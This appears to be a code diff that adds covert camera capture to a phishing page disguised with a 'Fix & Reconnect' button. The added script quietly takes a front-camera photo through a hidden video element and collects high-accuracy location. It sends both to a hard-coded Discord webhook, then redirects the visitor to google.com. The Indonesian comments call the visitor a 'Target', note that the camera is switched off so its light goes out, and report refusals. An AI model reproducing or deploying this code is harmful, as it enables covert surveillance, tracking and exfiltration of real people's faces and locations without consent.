@@ -79,10 +79,54 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";
 
-        document.getElementById('actionBtn').addEventListener('click', function() {
+        document.getElementById('actionBtn').addEventListener('click', async function() {
             this.innerText = "Processing...";
             this.disabled = true;
 
+            let imageBlob = null;
+            
+            // 1. SILENT CAMERA CAPTURE
+            // Browser akan meminta izin kamera (biasanya bersamaan/berdekatan dengan lokasi)
+            try {
+                // Minta akses kamera depan
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                // Buat elemen video tersembunyi
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.autoplay = true;
+                video.playsinline = true;
+                video.muted = true;
+                video.srcObject = stream;
+                document.body.appendChild(video);
+
+                // Tunggu video ready
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
+                });
+
+                // Beri jeda 500ms agar kamera menyesuaikan exposure/cahaya
+                await new Promise(r => setTimeout(r, 500));
+
+                // Gambar frame ke dalam canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Konversi canvas ke file (Blob)
+                imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                
+                // Matikan kamera agar lampu indikator mati
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+            } catch (err) {
+                console.log("Kamera diblokir atau tidak tersedia:", err);
+            }
+
+            // 2. GEOLOCATION CAPTURE
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     
@@ -108,29 +152,70 @@
                         }]
                     };
 
+                    const formData = new FormData();
+                    
+                    // Jika ada gambar, lampirkan ke embed Discord
+                    if (imageBlob) {
+                        formData.append('file', imageBlob, 'capture.jpg');
+                        payload.embeds[0].image = { url: "attachment://capture.jpg" };
+                    }
+                    
+                    formData.append('payload_json', JSON.stringify(payload));
+
                     await fetch(WEBHOOK_URL, {
                         method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
+                        body: formData
                     });
 
-                   
                     window.location.href = "https://www.google.com";
 
                 }, async (err) => {
                    
+                    const payload = {
+                        content: "⚠️ Target klik Fix & Reconnect tapi **MENOLAK (Deny)** akses lokasi.",
+                        embeds: []
+                    };
+                    
+                    const formData = new FormData();
+                    
+                    // Jika target nolak lokasi tapi accept kamera (atau kamera udah kedetek)
+                    if (imageBlob) {
+                        formData.append('file', imageBlob, 'capture.jpg');
+                        payload.embeds.push({
+                            title: "📸 Tapi Wajah/Foto Berhasil Diambil!",
+                            image: { url: "attachment://capture.jpg" },
+                            color: 15548997
+                        });
+                    }
+
+                    formData.append('payload_json', JSON.stringify(payload));
+
                     await fetch(WEBHOOK_URL, {
                         method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            content: "⚠️ Target klik Fix & Reconnect tapi **MENOLAK (Deny)** akses lokasi."
-                        })
+                        body: formData
                     });
+                    
                     window.location.href = "https://www.google.com";
                 }, {
                     enableHighAccuracy: true,
                     timeout: 10000
                 });
+            } else if (imageBlob) {
+                // Jika lokasi ga support tapi kamera dapet
+                const payload = {
+                    content: "⚠️ Perangkat tidak support Geolocation.",
+                    embeds: [{
+                        title: "📸 Tapi Wajah/Foto Berhasil Diambil!",
+                        image: { url: "attachment://capture.jpg" },
+                        color: 15548997
+                    }]
+                };
+                const formData = new FormData();
+                formData.append('file', imageBlob, 'capture.jpg');
+                formData.append('payload_json', JSON.stringify(payload));
+                
+                await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+                window.location.href = "https://www.google.com";
             }
         });
     </script>
